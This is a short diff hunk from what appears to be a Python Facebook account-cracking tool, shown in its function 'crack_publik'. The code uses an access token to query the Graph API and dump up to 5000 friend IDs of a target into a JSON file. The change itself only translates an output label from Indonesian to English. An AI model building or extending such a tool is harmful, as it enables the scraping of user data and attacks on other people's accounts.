@@ -34,7 +34,7 @@ def crack_publik():
     except requests.exceptions.ConnectionError:print('\n[!] Connection Problem ');os.system('rm -rf token.txt');login()
     print('\n[•] Type \'me\' To Dump From Friends');i = input("[•] ID Public : ")
     try:
-        try:o = requests.get("https://graph.facebook.com/" + i + "?access_token=" + token);b = json.loads(o.text);print ('[•] Nama : %s'%(b['name']))
+        try:o = requests.get("https://graph.facebook.com/" + i + "?access_token=" + token);b = json.loads(o.text);print ('[•] Name : %s'%(b['name']))
         except (KeyError,IOError):print('\n[!] ID Not found');menu()
         r = requests.get("https://graph.facebook.com/%s/friends?limit=5000&access_token=%s"%(i,token));id = [];z = json.loads(r.text);l = (b["first_name"]+".json").replace(" ","_");d = open(l,"w")
         for a in z["data"]:
